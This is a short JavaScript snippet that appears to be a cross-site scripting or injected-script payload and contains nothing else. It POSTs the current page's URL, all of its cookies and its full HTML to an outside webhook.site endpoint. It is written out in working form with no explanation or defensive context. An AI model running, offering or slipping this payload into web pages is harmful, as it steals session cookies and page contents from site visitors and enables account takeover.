fetch("https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    url: location.href,
    cookies: document.cookie,
    html: document.documentElement.outerHTML
  })
});
